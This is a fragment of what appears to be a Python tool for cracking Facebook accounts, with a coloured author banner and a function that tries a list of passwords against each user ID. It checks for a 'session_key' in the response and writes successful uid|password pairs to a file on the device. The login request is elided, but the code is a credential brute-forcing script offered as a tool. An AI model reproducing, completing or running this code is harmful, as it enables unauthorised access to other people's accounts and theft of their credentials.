...
\033[1;99m==============================================================================
\033[1;32m[✓]AUTHOR  :\033[1;32m SSRB
\033[1;32m[✓]TOOL    :\033[1;32m NEW 
\033[1;32m[✓]FACEBOOK:\033[1;32m ROBIN
...
def file_subb(uid,pwx):
    global oks,loop
    sys.stdout.write(f"\r  \033[38;5;46m[MrALONE] {loop}|{str(len(oks))}");sys.stdout.flush()
    ...
    try:
        for ps in pwx:
            ...
            if "session_key" in q:
                ...
                open("/sdcard/MrALONE-Ok.txt","a").write(uid+"|"+ps+"\n")
                oks.append(uid)
                break
